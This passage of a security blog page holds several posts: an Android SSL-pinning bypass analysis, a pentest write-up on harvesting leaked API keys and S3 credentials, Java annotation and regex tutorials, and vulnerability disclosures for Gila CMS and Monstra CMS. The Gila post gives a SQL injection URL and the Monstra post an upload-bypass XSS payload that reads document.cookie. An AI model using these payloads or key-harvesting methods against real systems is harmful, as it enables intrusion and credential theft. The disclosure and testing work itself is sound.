CertificateException(&quot;checkServerTrusted: AuthType is not ECDHE_RSA&quot;);</span><br><span class="line">      throw new CertificateException(&quot;checkServerTrusted: X509Certificate is empty&quot;);</span><br><span class="line">      throw new CertificateException(&quot;checkServerTrusted: X509Certificate array is null&quot;);</span><br><span class="line">      label406:</span><br><span class="line">      Object localObject2 = &quot;test.cer&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public X509Certificate[] getAcceptedIssuers()</span><br><span class="line">  &#123;</span><br><span class="line">    return new X509Certificate[0];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>代码中实现了X509TrustManager，重写了checkServerTrusted方法，实现ssl单项校验（虽然他们的开发再三说是双向校验）<br>具体分析校验方式：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">  //certificate.getSubjectDN();//获取主体名</span><br><span class="line">// certificate.getSigAlgName();//获取签名算法</span><br><span class="line">//certificate.getNotBefore();//获取有效期</span><br><span class="line">//certificate.getIssuerDN();//获取签发者</span><br></pre></td></tr></table></figure></div>

<p>其中校验的代码如下：<br><img src="https://i.loli.net/2020/01/04/GFEzwJ9VDfUYejX.png" alt="图片.png"><br>调用用此类的具体代码分析：<br><img src="https://i.loli.net/2020/01/04/9P4lE3hBpxWgrnJ.png" alt="图片.png"><br>返回SSLSocketFactory后，基本就完成了OKhttp3的安全配置。然后客户端再发起URl的请求。一般来说交易所实现的API接口是Retrofit，而Retrofit默Retrofit认是以OkHttpClient为依赖。<br>配置代码如下：<br><img src="https://i.loli.net/2020/01/04/w2LNmcHB9TkX6uP.png" alt="图片.png"><br>开发相关完整的调用和配置可以参考博客：<br><a href="https://blog.csdn.net/gary_yan/article/details/77990109" target="_blank" rel="noopener">https://blog.csdn.net/gary_yan/article/details/77990109</a></p>
<h4 id="三问："><a href="#三问：" class="headerlink" title="三问："></a>三问：</h4><h3 id="1-为什么justtrustme-hook为什么可以绕过部分校验"><a href="#1-为什么justtrustme-hook为什么可以绕过部分校验" class="headerlink" title="1 为什么justtrustme hook为什么可以绕过部分校验"></a>1 为什么justtrustme hook为什么可以绕过部分校验</h3><p>分析justtrustme hook代码<br>基本上看到findAndHookConstructor和findAndHookMethod，一种是hook构造方法，一种是hook普通方法，对安卓下ssl多种调用写法进行了hook<br><img src="https://i.loli.net/2020/01/04/qmZ9wevPQbAEBRn.png" alt="图片.png"><br>替换相关参数并返回<br><img src="https://i.loli.net/2020/01/04/DICpWyvrGquE6Md.png" alt="图片.png"></p>
<p>至于绕不过的情况：1函数名被更改或者插件中未有相关对应方法进行hook 2 有反hook的安全措施 3 代码混淆在执行过程中无法hook到对应代码方法名</p>
<h3 id="2-如果绕不过办"><a href="#2-如果绕不过办" class="headerlink" title="2 如果绕不过办"></a>2 如果绕不过办</h3><p>如果安装包没有做签名校验或者壳难以脱出，建议替换证书，或者亲自写hook代码，模仿justtrustme或者frida实现hook</p>
<h3 id="3-如何优雅的绕过"><a href="#3-如何优雅的绕过" class="headerlink" title="3 如何优雅的绕过"></a>3 如何优雅的绕过</h3><p>将证书导入burp，证书管理秘钥自己随便设置（此秘钥并非证书私钥，一定要区分），不过这里也要分情况。<br>附一张可以抓到包的截图<br><img src="https://i.loli.net/2020/01/04/W7xhXZkNsD54ioY.png" alt="图片.png"></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-Get-Some-Keys" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/12/Get-Some-Keys/">Get Some Keys</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/12/12/Get-Some-Keys/" class="article-date">
  <time datetime="2019-12-12T02:10:54.000Z" itemprop="datePublished">2019-12-12</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p><strong>author:RUNTest</strong></p>
<p><strong>前言</strong><br>渗透测试遇到的几个demo,至此遇到web和移动端的几个案例，写文总结，不忘勤勉。</p>
<h3 id="0x01-移动端第三方权限"><a href="#0x01-移动端第三方权限" class="headerlink" title="0x01 移动端第三方权限"></a><strong>0x01 移动端第三方权限</strong></h3><p>某次测试中，发现多处SDK厂商的存储桶以及接口控制台权限,不过有些需要脱壳才能获取硬编码信息往往写在com包的配置类，这样方便统一调用。不同SDK可能硬编码位置不同，如视频类SDK，推送类SDK，埋点类SDK需要结合具体业务场景进行发现。<br>案例：<br>dex中定位com包中的所有第三方服务配置url：</p>
<p><img src="https://i.loli.net/2019/12/12/MXtsUTICSQx69WF.png" alt="图片.png"><br>获取相关信息,可读官方文档定位：<br><img src="https://i.loli.net/2019/12/12/uwgoDkAnGUdzWfy.png" alt="图片.png"><br>POC</p>
<p><img src="https://i.loli.net/2019/12/12/q62EbDFPrsZLeYA.png" alt="图片.png"></p>
<h3 id="0x02-短信接口权限"><a href="#0x02-短信接口权限" class="headerlink" title="0x02 短信接口权限"></a><strong>0x02 短信接口权限</strong></h3><p>在以往的渗透测试过程，对网站或者手机验证码这一部分都会想到轰炸，以及验证码绕过和各种逻辑漏洞，然而一些网站要么限制发送的短信次数，要么限制手机号，有的还有验证码，有时候无法绕过人家的限制，这个时候，问题就又回归到了信息搜集。在信息搜集的啥时候多关注一些秘钥信息，就可以发现一些问题，以下为案例。<br> 某处代码泄露了秘钥导致接口权限被获取，拿到了短信接口的秘钥，如果没有API文档或者代码中没有明显的调用方式，就显得比较鸡肋。接下来我们需要想办法找到对应的API接口文档，一般来说，第三方的接口和接口地址都是统一域名下或者二三级域名下。<br><img src="https://i.loli.net/2019/12/12/4svhXnLrV2WuOAT.png" alt="图片.png"></p>
<p>  通过阅读第三方的接口文档，可以很好的根据秘钥计算出需要拼接的参数，用bp发包几次，发现可以响应并且可以看到一些内容，比如短信余额等。开发者往往会利用返回包的字段去做进一步的业务场景判断，如发送是否成功。<br><img src="https://i.loli.net/2019/12/12/zEHgLRuXNfasJPq.png" alt="图片.png"></p>
<p>POC</p>
<p> <img src="https://i.loli.net/2019/12/12/uxqHPjvi1gTNbfW.png" alt="图片.png"></p>
<h3 id="0x03-某公众号"><a href="#0x03-某公众号" class="headerlink" title="0x03 某公众号"></a>0x03 某公众号</h3><p>现实中大部分网站都需要与微信服务器发生交互，比如OAuth第三方登录，微信公众号宣传，微信小程序等，研究这些应用是如何和我们自己的网站或app交互，那么在安全测试过程中格外关注秘钥的安全和交互流程的安全。<br>如果代码中找打不到泄露该怎么搞呢，或者其他渠道也搞不到，这个时候，可以回归到网站或程序本身，去找需要和第三方程序交互的业务部分，通过抓包分析和参考接口调用过程，会有一个比较好的逻辑，当然有程序员会把秘钥在数据包中传输（反正我没遇到过），有的会硬编码到js或者app的代码中，如果代码做了混淆或者难以脱壳，我们是否可以换个角度去搞到秘钥呢？<br>下面一个案例比较有意思<br> 是否可以通过程序中使用框架报错或者异常机制获取到这些信息呢？<br>  POC：</p>
<p><img src="https://i.loli.net/2019/12/12/D1n7IsPjxNphYeg.png" alt="图片.png"></p>
<p> 可以发现可以获取到微信工装平台的用户信息，通过参考微信API文档还有更多的功能。<br> 这个漏洞有点奇葩，其实key是通过站点请求微信二维码的过程中，输入异常的字符串获取的，可以发送一些自己构造的异常数据包来看后台框架报错信息，进一步利用，异常的字符串或者数据可以夹杂些不同编码的字符串，或者加一些sql注入的语句，后端框架无法解析string或者触发拦截器或者输入后台接口所规定的字符串长度值会抛出异常作为响应。<br>以下是通过出发安全机制抛出程序上下文信息，其中就夹杂了我们需要的信息。</p>
<p><img src="https://i.loli.net/2019/12/12/V45q7voDYIiJhEe.png" alt="图片.png"></p>
<p>先说一下access_token，微信有俩种<a href="https://blog.csdn.net/benben_2015/article/details/79703508" target="_blank" rel="noopener">点这里</a><br>以公众号为例<br>微信官方这这样定义的：</p>
<p><img src="https://i.loli.net/2019/12/12/i28bqSR4EfFWCKm.png" alt="image.png"><br>通过查看文档发现</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">appid=APPID&amp;secret=APPSECRET</span><br></pre></td></tr></table></figure></div>

<p>需要以上字段才可以，但是又无法获取这俩字段，幸运的是通过错误信息可以直接拿到access_token，access_token在用户调用微信接口服务中起着重要作用，官方文档的描述是 “access_token是公众号的全局唯一接口调用凭据，公众号调用各接口时都需使用access_token。开发者需要进行妥善保存”<br>通过此字段，参考微信文档，可以直接get到微信公众号的很多部分API权限。<br>无需写代码，通过微信自定义的测试页面就可以展开很好的测试</p>
<h3 id="0x04-Git泄露获取s3"><a href="#0x04-Git泄露获取s3" class="headerlink" title="0x04 Git泄露获取s3"></a><strong>0x04 Git泄露获取s3</strong></h3><p>在某次CTF中，发现了git泄露，但是怎么都找不到具体可以利用的信息（被自己菜哭了），获取到的配置如下<br><img src="https://i.loli.net/2019/12/12/lbuMANsdEo4mihI.png" alt="image.png"><br>看到S3便想到了aws，但是多次尝试S3的域名和id和key并未能授权登录<br>不存在未授权的漏洞<br><img src="https://i.loli.net/2019/12/12/Paw1EiTmu4BLZhM.png" alt="image.png"></p>
<p>最后的思路居然通过git log,查看到历史的commit版本，然后chechout 历史的commit，就会看到完整的信息。<br><img src="https://i.loli.net/2019/12/12/cIeZtlGugxSjpWv.png" alt="image.png"><br>get s3<br><img src="https://i.loli.net/2019/12/12/GjlTOHxsu4LqUim.png" alt="image.png"><br>OSS和s3有类似之处<br><img src="https://i.loli.net/2019/12/12/odsnMWE2bSIpxav.png" alt="image.png"><br>AWS控制台的配置信息或者各种实例的的秘钥信息等都可以获取相关权限，当然如果没有配置安全组的情况下比较有效。</p>
<h3 id="0x04-最后"><a href="#0x04-最后" class="headerlink" title="0x04 最后"></a><strong>0x04 最后</strong></h3><p>米斯特很nice</p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-Java注解" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/20/Java注解/">Java注解</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/20/Java注解/" class="article-date">
  <time datetime="2019-10-20T05:53:44.000Z" itemprop="datePublished">2019-10-20</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p>温故而知新，总结一下<br><strong>0x01 注解基础知识</strong><br>注解和jdk版本关系：从JDK5开始<br>什么是注解：代码的标签，是源代码的元数据。<br>注解的作用：读懂别人的代码，简化代码的配置<br>注解的本质：1，附属于代码，依赖于方法，类，属性存在<br>         2，本身没有任何作用，在恰当的时候有外部程序解析产生<br>注解的分类：1，JDk内置注解（@Override、@Derprecated、@SupperWarnings）<br>         2，第三方框架的注解：<br>          Spring：@Autowired @Controller @Service @Respository<br>          Mybatis:@InsertProvider @Update @Options<br>         3,按照生命周期进行分类：<br>          （1），SOURCE源码注解<br>          （2），CLASS编译时注解：存在于源码及class文件中<br>          （3）, RUNTIME运行时注解：注解保留到运行时，甚至还会影响运行逻辑，@autowired属于运行时注解</p>
<p>元注解：注解的注解<br>   @Retention 定义生命周期，可选值：SOURCE,CLASS，RUNTIME<br>   @Documented 文档化注解<br>   @Inherited 注解是自动继承的<br>   @Target 注解的使用范围</p>
<p>   自定义注解无法规则：成员以无参方式声明；可以使用deafault关键字指定默认值，成员类型是受限制的，合法的类型包括<br>   注解类可以没有成员，没有成员的注解称为标识注解</p>
<p><strong>0x02举个例子</strong><br>   编辑器环境：IDEA<br>   定义一个注解类：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">import javax.management.relation.RelationType;</span><br><span class="line">import java.lang.annotation.*;</span><br><span class="line"></span><br><span class="line">@Target (&#123;ElementType.METHOD,ElementType.TYPE&#125;)</span><br><span class="line">@Retention (RetentionPolicy.RUNTIME)//注解可以保留到程序运行的时候</span><br><span class="line">@Inherited</span><br><span class="line">@Documented</span><br><span class="line">public @interface Description &#123;//注解的属性</span><br><span class="line">    String desc();//描述内容</span><br><span class="line">    String author();//描述作者</span><br><span class="line">    int age() default 18;//描述年龄</span><br><span class="line">    /*</span><br><span class="line">     */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>定义一个普通类</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">@Description (</span><br><span class="line">        desc = &quot;a&quot;,</span><br><span class="line">        author = &quot;b&quot;,</span><br><span class="line">        age = 19</span><br><span class="line">)</span><br><span class="line">public class testnew &#123;</span><br><span class="line">  String desc;</span><br><span class="line">  String author;</span><br><span class="line">  int age;</span><br><span class="line"></span><br><span class="line">    public String getDesc() &#123;</span><br><span class="line">        return desc;</span><br><span class="line">    &#125;</span><br><span class="line">    @Description (</span><br><span class="line">            desc = &quot;a&quot;,</span><br><span class="line">            author = &quot;b&quot;,</span><br><span class="line">            age = 19</span><br><span class="line">    )</span><br><span class="line">    public void setDesc(String desc) &#123;</span><br><span class="line">        this.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getAuthor() &#123;</span><br><span class="line">        return author;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAuthor(String author) &#123;</span><br><span class="line">        this.author = author;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        this.age=1;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line"></span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>main方法读取类的注解，一些知名的框架通过注解来实现配置简单化，这个时候往往用到了java反射机制来实现，这也就是为什么有些课程会讲到框架的底层靠反射实现</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">import com.sun.tools.javac.comp.Annotate;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.lang.annotation.Annotation;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.out.println(&quot;Hello World!&quot;);</span><br><span class="line">        test1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void test1()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //使用类加载器</span><br><span class="line">            Class clazz = Class.forName ( &quot;testnew&quot;);</span><br><span class="line">            //类是否有注解</span><br><span class="line">            boolean isClsExits =clazz.isAnnotationPresent ( Description.class );//</span><br><span class="line">            System.out.println (isClsExits);</span><br><span class="line"></span><br><span class="line">            if (isClsExits)&#123;</span><br><span class="line">                Description test=(Description)clazz.getAnnotation(Description.class);</span><br><span class="line">                System.out.println (test.author ());</span><br><span class="line">            &#125;</span><br><span class="line">            //获取类的注解</span><br><span class="line">            Annotation[] annotations=clazz.getAnnotations ();</span><br><span class="line"></span><br><span class="line">            for (Annotation a :annotations)&#123;</span><br><span class="line">                System.out.println (a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            //获取 方法的注解</span><br><span class="line">            Method[] met =clazz.getMethods ();</span><br><span class="line">            for (Method method :met)&#123;</span><br><span class="line">                boolean ismetExits =method.isAnnotationPresent (Description.class );</span><br><span class="line">                if (ismetExits)&#123;</span><br><span class="line">                Description des =(Description)method.getAnnotation (Description.class);</span><br><span class="line">                //获取方法的注解的某个属性</span><br><span class="line">                    System.out.println (des.age ());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            System.out.println (clazz.getName ());//获取包名和类名</span><br><span class="line">            System.out.println (clazz.getSimpleName ());//获取类名</span><br><span class="line">            //调用类的方式1</span><br><span class="line">//            Object object = clazz.newInstance();</span><br><span class="line">            Method method = clazz.getMethod(&quot;getAge&quot;);//获取类的某个方法</span><br><span class="line">//            System.out.println(method.invoke(object));</span><br><span class="line">            //调用类的方式2</span><br><span class="line">            Object obj = method.invoke(clazz.newInstance());</span><br><span class="line"></span><br><span class="line">            System.out.println(obj);</span><br><span class="line">            //获取类的所有方法</span><br><span class="line">//            Method[] methods1 = clazz.getMethods();</span><br><span class="line">//            for (Method method2 : methods1) &#123;</span><br><span class="line">//                //获取类中方法的全名(eg:public com.test.Main())</span><br><span class="line">//                System.out.println(method2);</span><br><span class="line">//            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125; catch (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125; catch (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125; catch (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>main方法运行结果：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">true</span><br><span class="line">b</span><br><span class="line">@Description(age=19, desc=a, author=b)</span><br><span class="line">19</span><br><span class="line">testnew</span><br><span class="line">testnew</span><br><span class="line">1</span><br></pre></td></tr></table></figure></div>
      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-SQL-injection-in-Gila-CMS-version-1-11-4" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/13/SQL-injection-in-Gila-CMS-version-1-11-4/">SQL injection in Gila CMS version 1.11.4</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/13/SQL-injection-in-Gila-CMS-version-1-11-4/" class="article-date">
  <time datetime="2019-10-13T10:03:05.000Z" itemprop="datePublished">2019-10-13</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p><strong>0x01</strong><br>I installed the latest version of GilaCMS (v1.11.4). After the administrator log in to the website, the search for the sql injection vulnerability exists in the content-&gt;pages-&gt;posts page.</p>
<p>The vulnerability related code is in lines 101 to 127 of /src/core/controllers/cm.php, the parameter $_GET is not filtered, and the line is directly brought into the getRows function to perform data query in line 122, resulting in sql injection.</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">function list_rowsAction ()</span><br><span class="line">&#123;</span><br><span class="line">  header(&apos;Content-Type: application/json&apos;);</span><br><span class="line">  $table = router::get(&quot;t&quot;,1);</span><br><span class="line">  $result = self::list_rows($table, $_GET, $_GET);</span><br><span class="line">  echo json_encode($result, JSON_PRETTY_PRINT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function list_rows ($table, $filters, $args)</span><br><span class="line">&#123;</span><br><span class="line">  if(isset($args[&apos;groupby&apos;])&amp;&amp;$args[&apos;groupby&apos;]!=null) &#123;</span><br><span class="line">    $this-&gt;group_rowsAction();</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  $pnk = new gTable($table, $this-&gt;permissions);</span><br><span class="line">  if(!$pnk-&gt;can(&apos;read&apos;)) return;</span><br><span class="line">  $result = [];</span><br><span class="line"></span><br><span class="line">  $fieldlist = isset($args[&apos;id&apos;]) ? &apos;edit&apos; : &apos;list&apos;;</span><br><span class="line">  $result[&apos;fields&apos;] = $pnk-&gt;fields($fieldlist);</span><br><span class="line">  $result[&apos;rows&apos;] = [];</span><br><span class="line">  $res = $pnk-&gt;getRows($filters, array_merge($args, [&apos;select&apos;=&gt;$result[&apos;fields&apos;]]));</span><br><span class="line">  foreach($res as $r) $result[&apos;rows&apos;][] = array_values($r);</span><br><span class="line">  $result[&apos;startIndex&apos;] = $pnk-&gt;startIndex($args);</span><br><span class="line">  $result[&apos;totalRows&apos;] = $pnk-&gt;totalRows($filters);</span><br><span class="line">  return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>0x02 Vulnerability certificate</strong><br>Vulnerability url:http://[address]:[port]/[app_path]/cm/list_rows/post?page=1&amp;search=qww’)+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT(‘123’,’456’),’789’)–+THB<br>Send a get query request after entering characters in the search box</p>
<p><img src="https://i.loli.net/2019/10/13/a3MgxbKeEjJIyO7.png" alt="F070CE3A-AF46-4258-888E-887DDEDBD717.png"></p>
<p>Then insert the SQL statement in the search parameter.Returns the field with 123456789 in the package, so you can execute sql. SQL injection exists</p>
<p><img src="https://i.loli.net/2019/10/13/VQEfxZP6OUv3m74.png" alt="A056417D-551C-4A59-9030-1EC061CE3475.png"></p>
<p><img src="https://i.loli.net/2019/10/13/j5vH74Zu6nB3sz8.png" alt="图片.png"><br>Sqlmap can also verify this vulnerability</p>
<p><img src="https://i.loli.net/2019/10/13/GNsEiIHy8vALBFM.png" alt="61FA3993-DD09-4AC4-BB88-140C0F02A642.png"></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-Bypass-the-HTML-file-suffix-restriction-when-uploading-files" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/12/Bypass-the-HTML-file-suffix-restriction-when-uploading-files/">Bypass the HTML file suffix restriction when uploading files</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/12/Bypass-the-HTML-file-suffix-restriction-when-uploading-files/" class="article-date">
  <time datetime="2019-10-12T12:55:33.000Z" itemprop="datePublished">2019-10-12</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p><strong>0x01</strong><br>I installed the latest version of monstra CMS and found upload bypass in the system<br><strong>In the latest version(3.0.4), the system forbids HTML suffix name upload, but now it can bypass it.</strong></p>
<p><img src="https://i.loli.net/2019/10/12/8PwIjNJXZu1TULV.png" alt="图片.png"></p>
<p><img src="https://i.loli.net/2019/10/12/FenPgaHhEcuR7xI.png" alt="图片.png"></p>
<p><strong>0x02</strong><br><strong>Vulnerability proof</strong></p>
<p>You can bypass the file upload limit by putting double quotes before the suffix of HTML </p>
<p>1  Visit website http://[address]:[port]/[app_path]/admin/index.php?id=filesmanager with login</p>
<p>2  Save html codes with ‘.png’extensions. and upload it like below.</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">    &lt;head&gt; </span><br><span class="line">	    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">        &lt;title&gt;hacker&lt;/title&gt; </span><br><span class="line">    &lt;/head&gt; </span><br><span class="line">    &lt;body&gt; </span><br><span class="line">     &lt;svg/onload=alert(document.cookie)&gt;</span><br><span class="line">    &lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2019/10/12/IKx9s3GArfTSLZa.png" alt="图片.png"></p>
<p>Click the uploaded file and Grab the packet and change the suffix name to XXX””.html at filename，This circumvents this limitation.</p>
<p><img src="https://i.loli.net/2019/10/12/gK1hOqvHtEIAJNL.png" alt="图片.png"></p>
<p><img src="https://i.loli.net/2019/10/12/tgcb9dJELnNDrx8.png" alt="图片.png"></p>
<p>4 move to http://[address]:[port]/[app_path]/public/uploads/[uploaded file]</p>
<p> You can see that you executed HTML and JS code，If you access this file,  you can get the administrator’s cookie and execute any JS code</p>
<p><img src="https://i.loli.net/2019/10/12/9oY3Vsy1IwCehjf.png" alt="图片.png"></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-正则表达式总结和引起的思考" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/22/正则表达式总结和引起的思考/">正则表达式总结和引起的思考</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/09/22/正则表达式总结和引起的思考/" class="article-date">
  <time datetime="2019-09-21T17:26:46.000Z" itemprop="datePublished">2019-09-22</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p><strong>基础知识</strong><br><strong>前言：</strong>最近公司在搞POC和EXP，在看代码的时候发现有的部分已经生疏了，所以又回头总结一下，包括php和Python的具体函数和使用以及漏洞案例</p>
<h4 id="0x01-基础部分"><a href="#0x01-基础部分" class="headerlink" title="0x01 基础部分"></a>0x01 基础部分</h4><p>字符：<br>. 匹配任意字符除了\n<br>[…] 匹配字符集<br>\d \D匹配数字/非数字<br>\s \S 匹配空白/非空白字符<br>\w \W 匹配单词字符[a-zA-Z0-9]/非单词字符<br>量词：</p>
<ul>
<li>匹配前一个字符0次或者无限次</li>
</ul>
<ul>
<li>匹配前一个字符1次或者无限次<br>？匹配其哪一个字符0次或者1次<br>{m}/{m,n}匹配其哪一个字符m次或者n次</li>
</ul>
<p>*？/+? /?? 匹配模式变为非贪婪，尽可能少匹配字符<br>^匹配字符串开头<br>$匹配字符串结尾<br>\A/\Z指定的字符串匹配必须出现在开头/结尾</p>
<h4 id="0x02-Python"><a href="#0x02-Python" class="headerlink" title="0x02 Python"></a>0x02 Python</h4><p>re.findall(“”,) 使用<br>re.findall(“”,)匹配所有<br>re.search(“”,)匹配一次</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">In [1]: import re                                                               </span><br><span class="line"></span><br><span class="line">In [2]: a= &apos;C|Java|Pythonn|Javascript&apos;                                          </span><br><span class="line"></span><br><span class="line">In [3]: r =  re.findall(&quot;Python&quot;,a)</span><br><span class="line">In [5]: r                                                                       </span><br><span class="line">Out[5]: [&apos;Python&apos;]</span><br><span class="line"></span><br><span class="line">#匹配数字</span><br><span class="line">In [6]: a = &apos;C54Java433#4564 Python|Java&apos;                                       </span><br><span class="line"></span><br><span class="line">In [7]: r = re.findall(&quot;\d&quot;,a)                                                  </span><br><span class="line"></span><br><span class="line">In [8]: r                                                                       </span><br><span class="line">Out[8]: [&apos;5&apos;, &apos;4&apos;, &apos;4&apos;, &apos;3&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;4&apos;]</span><br><span class="line">In [31]: r = re.findall(&quot;\d+&quot;,a) </span><br><span class="line">In [32]: r                                                                      </span><br><span class="line">Out[32]: [&apos;54&apos;, &apos;433&apos;, &apos;4564&apos;]</span><br><span class="line">#匹配非单词字符</span><br><span class="line">In [21]: r = re.findall(&quot;\W&quot;,a)                                                 </span><br><span class="line"></span><br><span class="line">In [22]: r                                                                      </span><br><span class="line">Out[22]: [&apos;#&apos;, &apos; &apos;, &apos;|&apos;]</span><br></pre></td></tr></table></figure></div>

<p>用正则表达式匹配url<br>图片处’img src=”(.*?)”‘</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">In [9]: url = &quot;http://www.xiaohuar.com/2014.html&quot;                               </span><br><span class="line"></span><br><span class="line">In [10]: res=req.get(url)                                                       </span><br><span class="line"></span><br><span class="line">In [11]: url = re.findall(&apos;img src=&quot;(.*?)&quot;&apos;,res.text)                           </span><br><span class="line"></span><br><span class="line">In [12]: url                                                                    </span><br><span class="line">Out[12]: </span><br><span class="line">[&apos;/d/file/20160316/a0bab5b5cc4f695012f4af1d871e7256.jpg&apos;,</span><br><span class="line"> &apos;http://www.xiaohuar.com/d/file/20140811101923185.jpg&apos;]</span><br><span class="line"> ……</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> In [13]: for i in url: </span><br><span class="line">    ...:     if i.startswith(&apos;/d&apos;): </span><br><span class="line">    ...:         i=&quot;http://www.xiaohuar.com&quot;+i </span><br><span class="line">    ...:     print(i) </span><br><span class="line">    ...:                                                                        